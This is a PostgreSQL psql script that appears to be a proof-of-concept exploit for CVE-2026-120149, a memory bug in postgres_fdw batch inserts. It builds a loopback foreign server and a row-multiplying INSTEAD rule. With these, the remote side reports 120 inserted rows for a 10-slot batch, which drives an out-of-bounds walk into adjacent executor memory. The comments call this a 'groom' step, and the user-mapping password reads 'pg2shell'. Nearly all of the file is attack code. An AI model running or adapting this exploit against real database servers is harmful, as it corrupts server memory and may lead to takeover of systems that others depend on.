-- Full-batch groom probe for CVE-2026-120149 (loopback only).
-- batch_size=10 and exactly 10 local rows => ExecInsert fills ri_Slots[0..9]
-- with valid slot pointers before the flush. The remote rule expands each row
-- into 12, so the FDW reports numInserted=120 and the OOB walk must proceed
-- past index 9 into adjacent es_query_cxt memory instead of faulting at i=2.
\set ON_ERROR_STOP off
CREATE EXTENSION IF NOT EXISTS postgres_fdw;
DROP FOREIGN TABLE IF EXISTS ftable;
DROP TABLE IF EXISTS batch_table, batch_rule_table;
CREATE TABLE batch_table (x int);
CREATE TABLE batch_rule_table (x int);
CREATE RULE batch_rule AS ON INSERT TO batch_table
  DO INSTEAD INSERT INTO batch_rule_table SELECT i FROM generate_series(1,12) i;
CREATE SERVER IF NOT EXISTS loopback FOREIGN DATA WRAPPER postgres_fdw
  OPTIONS (host '127.0.0.1', port '5432', dbname 'postgres');
CREATE USER MAPPING IF NOT EXISTS FOR postgres SERVER loopback
  OPTIONS (user 'postgres', password 'pg2shell');
CREATE FOREIGN TABLE ftable (x int) SERVER loopback
  OPTIONS (table_name 'batch_table', batch_size '10');
\echo == FULL-BATCH PROBE: 10 rows sent, rule reports 120, batch_size 10 ==
INSERT INTO ftable SELECT i FROM generate_series(1,10) i;
\echo == END FULL-BATCH PROBE ==
